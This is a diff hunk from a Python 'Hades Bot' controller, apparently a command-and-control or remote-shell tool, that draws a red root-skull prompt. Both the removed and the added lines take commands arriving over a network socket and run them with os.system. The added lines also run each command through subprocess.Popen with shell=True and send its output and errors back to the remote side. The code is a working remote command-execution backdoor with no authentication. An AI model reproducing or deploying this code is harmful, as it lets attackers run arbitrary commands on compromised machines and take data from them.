@@ -57,14 +57,14 @@ class Controller(object):
                         host_format = '''
 {red}┌──(root💀{host_name})-[{cwd}]
 {red}└─# {white}'''.format(host_name=host,cwd=working_directory,red=Fore.RED,white=Fore.WHITE)
-                    cmd_read = client_socket.recv(buffer_size).decode()
-                    print(host_format,end='')
-                    arbitrary_cmd_exec = os.system(cmd_read)
-                    bot_command = client_socket.send(bytes(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Hades Bot-Command: ",'utf-8') + cmd_read.encode())
-                    #output = client_socket.recv(buffer_size).decode()
-                    #results = output.split(SEPARATOR)
-                    #client_socket.send(bytes(str(results),"utf-8"))
-
+                    client_socket.send(f'{host_format}'.encode())
+                    cmd = client_socket.recv(buffer_size).decode()
+                    print(f"{host_format}")
+                    os.system(cmd)
+                    console = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+                    client_socket.send(console.stdout.read())
+                    client_socket.send(console.stderr.read())
+                    #console = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
         except Exception as Err:
             if Err == "int() argument must be a string, a bytes-like object or a number, not 'NoneType'":
                 print(f'{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}]You cant leave the arguments empty.')
